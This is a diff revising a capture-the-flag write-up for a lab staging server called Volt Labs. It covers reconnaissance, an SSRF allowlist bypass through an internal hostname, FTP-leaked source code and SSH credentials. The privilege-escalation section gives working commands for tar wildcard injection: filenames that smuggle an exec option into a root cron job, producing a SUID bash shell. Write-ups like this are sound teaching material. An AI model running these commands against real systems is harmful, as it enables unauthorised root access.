@@ -1,40 +1,52 @@
-# Operation Coldstart Write Up
+# Operation Coldstart — Write-Up
 
-### To begin we are prompted with the following scenario:
-Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.
+### Scenario
 
-**To begin, lets start with a simple nmap scan to detect what services are running on the target server and spot any vulnerable versions of these services**
+Volt Labs, a small SaaS company, suspects an old staging server has become an exposed liability. The objective is to find a way in and demonstrate full compromise.
+
+---
+
+### Reconnaissance
+
+To begin, a basic nmap scan was run against the target to identify open ports and detect any vulnerable service versions.
 
 <img width="1916" height="917" alt="image" src="https://github.com/user-attachments/assets/048239c2-3364-4d99-b37f-5f94c0b97ffa" />
 
-As we can see from the following scan, Volt Labs has the following open ports:
-- Port 21: FTP Control Port running vsftpd 3.0.5
-- Port 22: SSH port running OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
-- Port 80: HTTP port running gunicorn
+The scan revealed three open ports:
 
-**Now that we know the server is running HTTP we can run a directory brute force scan using gobuster to gain some more information**
+- **Port 21** — FTP running vsftpd 3.0.5
+- **Port 22** — SSH running OpenSSH 9.6p1 on Ubuntu
+- **Port 80** — HTTP running Gunicorn
+
+---
+
+### Web Enumeration
+
+With HTTP confirmed, a directory brute force scan was run using Gobuster to enumerate available endpoints.
 
 <img width="1216" height="684" alt="image" src="https://github.com/user-attachments/assets/62781580-c290-4176-b46b-337c9d978d81" />
 
-We have enumerated an /admin and /preview endpoint
+Two endpoints were discovered: **/admin** and **/preview**. File extension fuzzing for common types such as .env, .txt, and .py did not yield any additional results.
 
-I also tested for common file extensions e.g. .env, .txt, .py but it did not yield any results.
+---
 
-**Lets take a look at the website**
+### Inspecting the Web Application
 
 <img width="1916" height="964" alt="image" src="https://github.com/user-attachments/assets/971c217e-0778-419f-8712-b6453501efca" />
 
-Interesting... The website acts as a URL Previews service that fetches external URLs and displays previews of the contents in your browser. The "© Volt Labs · do not expose externally" footer in the page confirms that this page should not be public. It is anyways.
+The application appears to be a URL preview service that fetches external URLs and renders their contents in the browser. The footer reads "© Volt Labs · do not expose externally", confirming this page was never intended to be public facing.
 
-This functionality is a classic Server Side Request Forgery (SSRF) target. If so, we can possibly borrow the server's network position to reach internal services.
+This functionality is a textbook Server-Side Request Forgery (SSRF) target. If exploitable, it could allow us to borrow the server's internal network position to reach services that would otherwise be inaccessible.
 
-**Lets check our endpoints**
+---
+
+### Endpoint Analysis
 
 **/admin**
 
 <img width="1276" height="620" alt="image" src="https://github.com/user-attachments/assets/ecac16b5-313d-401f-9f40-83d71772cd07" />
 
-This endpoint redirects us to the /admin/ directory with a HTTP 403 Forbidden Status Code.
+Navigating to /admin redirects to /admin/ and returns an HTTP 403 Forbidden response.
 
 **/preview**
 
@@ -42,40 +54,35 @@ This endpoint redirects us to the /admin/ directory with a HTTP 403 Forbidden St
 
 This further confirms our suspicions of a possible SSRF entry point
 
-Notice the "staging" label in the top right-hand corner. This tells us that this is likely a dev/staging environment and could have fewer protections
+The /preview endpoint confirms the SSRF suspicion. The "staging" label visible in the top right corner suggests this is a development environment that may have reduced security controls.
 
-**Lets look into this endpoint in more depth**
+---
 
-Upon testing an SSRF payload we are met with this message:
+### SSRF Exploitation Attempt
+
+Testing a basic SSRF payload against the ?url= parameter returned a block message indicating a server-side allowlist was in place.
 
 <img width="1282" height="626" alt="image" src="https://github.com/user-attachments/assets/2fdd6481-ac5a-4306-a870-b56292b619af" />
 
-I tried a couple more obfuscation methods for the query parameter:
-?url=http://127.0.0.1
-?url=http://0.0.0.0
-?url=http://[::1]
-?url=http://2130706433   (decimal) 
-?url=http://0x7f000001   (hex)
+All obfuscation payloads attempted were blocked. Header injection was also tested via Burp Suite, including Host header manipulation, but did not prove effective.
 
-There seems to be a server-side allow list that is blocking our attempts to gain network positioning.
+---
 
-I also pulled up Burp Suite and checked if there were any header injection vulnerabilites that we could take advantage of including a Host header but this did not prove to be worth while.
+### FTP Enumeration
 
-**The allowlist on the website seem to be pretty strict. After a little while of testing I moved to the FTP service to see if we had any luck there**
+With the allowlist proving resistant to bypass, attention shifted to the FTP service identified during reconnaissance.
 
 <img width="1916" height="957" alt="image" src="https://github.com/user-attachments/assets/6fdd169f-1a56-4225-8675-ea74024ff7c3" />
 
-Anonymous FTP login was enabled on the server
+Anonymous login was enabled on the server. A file named **backup.tar.gz** was discovered and downloaded for further inspection.
 
 <img width="809" height="559" alt="image" src="https://github.com/user-attachments/assets/b3967466-6fc0-49d4-a1b7-2006f8840afe" />
 
-I have found a file named "backup.tar.gz". I will download the file to see what it contains
+---
 
-**After unpacking the tar.gz file it appears we have a new directory named "/voltlabs-preview"**
+### Source Code Analysis
 
-Inside this directory we have a README.md, app.py, and requirements.txt file.
-
-Lets look at the README.md file
+After extracting the archive, a directory named **/voltlabs-preview** was found containing three files: README.md, app.py, and requirements.txt.
 
 **README.md**
 
@@ -89,34 +96,88 @@ Lets look at the README.md file
 
 <img width="956" height="657" alt="image" src="https://github.com/user-attachments/assets/f21aefea-ed17-4f2f-a40c-ba7bbfb83e42" />
 
-We seem to have finally found the allow list for the URL preview service which is "kestrel.thm". Better yet, this domain resolves to local host on the server side. We may finally be able to access the /admin/ directory.
+Reviewing app.py revealed the allowlist configuration:
 
-**Testing the admin endpoint with the new domain**
+```python
+ALLOWED_HOSTS = {"kestrel.thm"}
+```
+
+A comment in the source code confirmed that **kestrel.thm** resolves to 127.0.0.1 via the server's /etc/hosts file. This meant requests to kestrel.thm would originate from localhost on the server side which was exactly what was needed to bypass both the allowlist and the /admin/ 403.
+
+Further inspection of the admin route revealed a hidden endpoint:
+
+```python
+if p == "notes":
+    with open("/opt/voltlabs-preview/admin_notes.txt") as f:
+        return "<pre>" + f.read() + "</pre>"
+```
+
+---
+
+### SSRF Confirmed — Accessing /admin/notes
 
 <img width="1122" height="888" alt="image" src="https://github.com/user-attachments/assets/a18e90f3-9781-4d5b-b8cd-0c565327a0f3" />
 
-It appears we officially have detected an SSRF vulnerability using this URL preview input.
-
-Upon looking further into the python script, we find something interesting:
-
-<img width="953" height="657" alt="image" src="https://github.com/user-attachments/assets/5c09e5a2-ae6b-4bd5-b92d-4a4d5e538b76" />
-
-We find that the endpoint /admin/notes exits.
-
-**Testing /admin/notes**
+Passing kestrel.thm through the ?url= parameter successfully bypassed the allowlist, confirming the SSRF vulnerability. Navigating to **/admin/notes** via the same vector returned the web developer's SSH credentials.
 
 <img width="1116" height="885" alt="image" src="https://github.com/user-attachments/assets/f323bbd0-fa3a-4d9a-ade3-d7e8a5527b47" />
 
-We now have the web developer's SSH credentials
+---
 
-After SSH'ing into the target machine we are able to locate the user.txt file which is flag one
+### Initial Access
+
+Using the recovered credentials, SSH access to the target machine was established. The first flag was located in the user's home directory.
 
 <img width="813" height="564" alt="image" src="https://github.com/user-attachments/assets/5f2348d6-f481-44dd-811b-9fc1d6a62b56" />
 
-After running "find / -name "flag.txt" 2>/dev/null", I concluded that the second flag does not exist on the SSH server
+---
+
+### Privilege Escalation
+
+**Enumeration**
+
+Local enumeration revealed a writable directory at **/opt/backups**. Further inspection uncovered a cron job at **/etc/cron.d/voltlabs-backup** running as root every minute:
+```
+# Volt Labs staging backup - runs as root
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
+```
+The wildcard `*` combined with write access to /opt/backups made this vulnerable to a tar wildcard injection attack.
+
+**Exploitation**
+
+A malicious script was created to copy bash to /tmp and set the SUID bit on it, allowing it to be executed with root privileges:
+
+```bash
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > shell.sh
+chmod +x shell.sh
+```
+
+Tar option filenames were then created to trick tar into executing the script as root:
+
+```bash
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+```
+
+When the cron job fired, tar expanded the wildcard, interpreted the filenames as command-line flags, and executed shell.sh as root. This copied bash to /tmp/rootbash with the SUID bit set.
+
+**Root Flag**
+
+The SUID bash binary was then executed with the -p flag to preserve root privileges:
+
+```bash
+/tmp/rootbash -p
+```
+
+With a root shell obtained, the final flag was retrieved.
 
 
+<img width="974" height="647" alt="image" src="https://github.com/user-attachments/assets/0b744286-0439-4e7b-ab01-ab0ba0f9aed8" />
 
+<img width="705" height="150" alt="image" src="https://github.com/user-attachments/assets/356c7579-3848-47cb-b24a-37006cb1ec77" />
 
 
 
